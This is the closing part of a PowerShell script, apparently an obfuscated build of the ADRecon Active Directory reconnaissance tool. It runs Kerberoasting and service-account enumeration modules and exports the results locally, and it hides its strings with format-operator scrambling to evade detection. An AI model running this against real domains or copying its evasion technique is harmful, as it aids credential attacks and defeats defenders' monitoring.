        Write-Output ("{4}{2}{8}{6}{1}{5}{3}{0}{7}" -f 'i',' ','-] GPOR','ke some t','[','- May ta','rt','me','epo')
        Get-ADRGPOReport -Method $Method -UseAltCreds $UseAltCreds -ADROutputDir $ADROutputDir
        Remove-Variable ("{1}{2}{0}" -f'ort','ADRGPORe','p')
    }
    If ($ADRKerberoast)
    {
        Write-Output ("{3}{0}{1}{2}{4}" -f'-',']',' Kerberoa','[','st')
        $ADRObject = Get-ADRKerberoast -Method $Method -objDomain $objDomain -Credential $Credential -PageSize $PageSize
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{2}{0}{1}" -f'rber','oast','Ke')
            Remove-Variable ("{0}{1}{2}"-f'AD','R','Object')
        }
        Remove-Variable ("{0}{3}{2}{1}" -f 'ADRKer','t','oas','ber')
    }
    If ($ADRDomainAccountsusedforServiceLogon)
    {
        Write-Output ("{7}{4}{12}{5}{0}{1}{9}{8}{10}{3}{6}{13}{11}{2}" -f ' Log','on - Needs Priv','t','ed',' for','ervice',' A','[-] Domain Accounts used','le','i','g','coun',' S','c')
        $ADRObject = Get-ADRDomainAccountsusedforServiceLogon -Method $Method -objDomain $objDomain -Credential $Credential -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{4}{6}{7}{2}{3}{0}{1}{5}" -f'vice','L','dfor','Ser','Dom','ogon','ai','nAccountsuse')
            Remove-Variable ("{2}{0}{1}"-f 'Obj','ect','ADR')
        }
        Remove-Variable ("{5}{4}{2}{0}{7}{3}{1}{6}"-f'sused','rvice','nt','Se','omainAccou','ADRD','Logon','for')
    }

    $TotalTime = "{0:N2}" -f ((Get-DateDiff -Date1 (Get-Date) -Date2 $date)."tOtA`Lmi`N`UtEs")

    $AboutADRecon = Get-ADRAbout -Method $Method -date $date -ADReconVersion $ADReconVersion -Credential $Credential -RanonComputer $RanonComputer -TotalTime $TotalTime

    If ( ($OutputType -Contains "CSV") -or ($OutputType -Contains "XML") -or ($OutputType -Contains ("{1}{0}" -f 'ON','JS')) -or ($OutputType -Contains ("{1}{0}" -f'TML','H')) )
    {
        If ($AboutADRecon)
        {
            Export-ADR -ADRObj $AboutADRecon -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{3}{2}{0}{1}"-f 't','ADRecon','bou','A')
        }
        Write-Output "[*] Total Execution Time (mins): $($TotalTime) "
        Write-Output ('[*'+'] '+'Outpu'+'t '+'Dir'+'ectory'+':'+' '+"$ADROutputDir")
        $ADRSTDOUT = $false
    }

    Switch ($OutputType)
    {
        ("{1}{0}{2}" -f 'O','STD','UT')
        {
            If ($ADRSTDOUT)
            {
                Write-Output "[*] Total Execution Time (mins): $($TotalTime) "
            }
        }
        ("{1}{0}" -f 'L','HTM')
        {
            Export-ADR -ADRObj $(New-Object ("{0}{1}{2}" -f 'P','S','Object')) -ADROutputDir $ADROutputDir -OutputType $([array] ("{1}{0}" -f 'L','HTM')) -ADRModuleName ("{0}{1}"-f'Ind','ex')
        }
        ("{0}{1}"-f'EXCE','L')
        {
            Export-ADRExcel $ADROutputDir
        }
    }
    Remove-Variable ("{1}{2}{0}" -f'me','TotalT','i')
    Remove-Variable ("{2}{0}{1}"-f 'ut','ADRecon','Abo')
    Set-Location $returndir
    Remove-Variable ("{2}{1}{0}" -f'ndir','etur','r')

    If (($Method -eq ("{0}{1}" -f'AD','WS')) -and $UseAltCreds)
    {
        Remove-PSDrive ("{0}{1}" -f'A','DR')
    }

    If ($Method -eq ("{1}{0}"-f 'P','LDA'))
    {
        $objDomain.("{0}{1}{2}" -f 'Disp','os','e').Invoke()
        $objDomainRootDSE.("{0}{2}{1}"-f 'Dis','se','po').Invoke()
    }

    If ($ADROutputDir)
    {
        Remove-EmptyADROutputDir $ADROutputDir $OutputType
    }

    Remove-Variable ("{4}{3}{0}{2}{1}" -f'onVers','on','i','ec','ADR')
    Remove-Variable ("{4}{3}{2}{1}{0}"-f'er','omput','nC','o','Ran')
}

If ($Log)
{
    Start-Transcript -Path "$(Get-Location)\ADRecon-Console-Log.txt"
}

Invoke-ADRecon -GenExcel $GenExcel -Method $Method -Collect $Collect -DomainController $DomainController -Credential $Credential -OutputType $OutputType -ADROutputDir $OutputDir -DormantTimeSpan $DormantTimeSpan -PassMaxAge $PassMaxAge -PageSize $PageSize -Threads $Threads

If ($Log)
{
    Stop-Transcript
}
